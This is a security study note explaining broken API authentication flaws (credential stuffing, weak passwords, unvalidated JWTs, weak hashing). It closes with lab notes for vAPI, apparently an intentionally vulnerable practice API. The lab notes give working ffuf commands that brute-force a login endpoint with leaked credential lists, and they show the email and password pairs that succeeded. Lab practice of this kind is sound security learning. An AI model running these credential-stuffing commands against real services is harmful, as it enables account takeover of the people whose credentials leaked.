## Features of Broken User Authentication

### Whenever one of the following conditions is true, we can speak of a Broken User Authentication

* -   If your API allows for credential stuffing, This is an attack where a hacker will try to brute force credentials by using a list with known account names and password from other websites. This works because people often re-use their old usernames and passwords so if their credentials leak one time, a lot of accounts are vulnerable. Attackers will take these old credentials and try them on [our API endpoints](https://www.wallarm.com/what/api-endpoint) rapidly to see if any of the accounts work on our application. Rate limiting should exits.
* -   If the API endpoint does not verify the request with a captcha when needed
* -   When the application allows for weak passwords. The best policy is to use a passphrase instead of a password but anything is better than a weak password.
* -   When the endpoint uses GET parameters (parameters in the URL) to send sensitive data such as passwords or tokens. This could allow for a [MiTM attack](https://www.wallarm.com/what/what-is-mitm-man-in-the-middle-attack).
* -   When our endpoint issues a token such as JWT but does not validate it.
* -   When we use JWT, we should be aware that we should not accept unsigned or weakly signed tokens.
* -   When the endpoint does not validate the expiration date of authentication tokens such as session tokens or JWT
* -   When the endpoint does not encrypt or hash the password or uses weak encryption algorithms.
* -   When it uses weak encryption keys that are easy to guess (Like a birthday) or easy to crack (like md5)


#### Some Notes how to exploit Broken User Authentication in vAPI

```
# To extract data from a comma seperated large file
cut -d "," -f 1 creds.csv > emails.txt  
cut -d "," -f 2 creds.csv > passwords.txt  
```


```
ffuf -w ~/vAPI/emails.txt:FUZZ1 -w ~/vAPI/passwords.txt:FUZZ2 -X POST -d '{"email":"FUZZ1","password":"FUZZ2"}' -H "Content-Type: application/json" -u http://192.168.1.26/vapi/api2/user/login -mc 200 -mode pitchfork -s


ffuf -w ~/test/emails.txt:FUZZ1 -w ~/test/passwords.txt:FUZZ2 -X POST -d '{"email":"FUZZ1","password":"FUZZ2"}' -H "Content-Type: application/json" -u http://127.0.0.1/vapi/api2/user/login -mc 200 -mode pitchfork -s

#GOT FOLLOWING RESULTS:
#FUZZ2 : zTyBwV/9 FFUFHASH : c98e61c7 FUZZ1 : savanna48@ortiz.com 
#FUZZ1 : hauck.aletha@yahoo.com FUZZ2 : kU-wDE7r FFUFHASH : c98e626a 
#FUZZ2 : kU-wDE7r FFUFHASH : c98e6323 FUZZ1 : harber.leif@beatty.info 

```

